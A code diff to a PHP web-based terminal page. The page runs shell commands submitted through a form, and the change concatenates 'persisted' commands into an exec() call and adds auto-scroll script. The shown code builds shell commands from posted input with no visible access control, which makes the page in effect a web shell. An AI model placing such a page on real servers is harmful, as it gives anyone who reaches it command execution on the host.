@@ -59,13 +59,12 @@
 			}
 			if (isset($_POST['persist']) AND $_POST['persist'] == 'true') {
 				array_push($_SESSION['persist_commands'], TRUE);
+				$previous_commands = $previous_commands . $command . '; ';
 			} else {
 				array_push($_SESSION['persist_commands'], FALSE);
 			}
 			array_push($_SESSION['commands'], $command);
 			array_push($_SESSION['command_responses'], $response);
-			
-			$previous_commands = $_POST['previous_commands'] . $command;
 		}
 	}
 	
@@ -137,9 +136,9 @@
 </head>
 <body>
 	<div class="content">
-		<div class="terminal" onclick="document.getElementById('command').focus();">
+		<div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
 			<div class="bar">
-				<?php echo `whoami`, ' - ', `pwd`; ?>
+				<?php echo `whoami`, ' - ', exec($previous_commands . 'pwd'); ?>
 			</div>
 			<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands" id="commands">
 				<input type="hidden" name="persist" id="persist" />
@@ -158,16 +157,18 @@
 				<input type="text" name="command" id="command" autocomplete="off" />
 				<input type="button" value="Persist" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" onclick="persist_command();" id="persist_button" /><?php } ?>
 			</form>
-			<script type="text/javascript">
-				document.getElementById('command').select();
-				
-				function persist_command() {
-					document.getElementById('persist').value='true';
-					document.getElementById('commands').submit();
-				}
-			</script>
 		</div>
 	</div>
+	<script type="text/javascript">
+		document.getElementById('command').select();
+		
+		document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+		
+		function persist_command() {
+			document.getElementById('persist').value='true';
+			document.getElementById('commands').submit();
+		}
+	</script>
 	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
 		<input type="hidden" name="clear" value="clear" />
 		<input type="submit" value="Clear" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" />
